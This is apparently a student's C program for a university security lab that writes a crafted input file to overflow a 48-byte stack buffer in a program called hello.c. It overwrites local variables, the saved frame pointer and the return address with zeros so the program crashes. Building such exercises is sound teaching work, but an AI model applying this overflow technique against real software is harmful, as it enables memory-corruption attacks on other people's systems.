/*----------------- ASPRIDIS NIKOLAOS csd5178 ----------------- createdata3.c -------- 2023-2024 ---------------------------------------------------------------------*/

/* This program has been created to be used to create a .txt file called
 * "data3.txt", that is going to be used as buffer input when hello.c program
 * is executed. If so, readString()'s return address is going to be
 * overwritten with "0000" address (address of NULL page for hello
 * executable). As a result, readString function is going to try to return
 * into NULL page, something that is going to cause a segmentation fault occur,
 * as it is forbidden to write/read into/from that part of the address space
 * of the program. */

#include <stdio.h>

int main(void) {

	FILE *fptr;
	int i;

	fptr = fopen("data3", "w");	
	if(!fptr) { 
		fprintf(stderr, "ERROR: fopen() malfunction!\nfile was not created -/- did not open successfully\nexit code -1\n");
		return -1;
	}else {
		printf("file created successfully!\n");
	}

	/* fills buf with '\0' characters */
	for(i=0; i<48; i++) 
		fputc(0, fptr);	

	/* overwrites c ---> c = 0 */
	for(i=0; i<4; i++)	
		fputc(0, fptr);
	
	/* overwrites i ---> i = 0-/-0-/-0-/-55 */
	/*for(i=0; i<3; i++) 	
		fputc(0, fptr);*/
	fputc(55, fptr);

	/* fills empty bytes with 0 */
	for(i=0; i<9; i++)
		fputc(0, fptr);		

	/* overwrites old ebp with 0 */
	for(i=0; i<4; i++)
		fputc(0, fptr);

	/* overwrites return address with 0 this is going to cause the segmentation fault! */
	for(i=0; i<4; i++)	
		fputc(0, fptr);		
	
	/* overwrites s with its original value */			
	fputc(224, fptr);
	fputc(66, fptr);
	fputc(14, fptr);
	fputc(8, fptr);

	fclose(fptr);

	return 0;

}
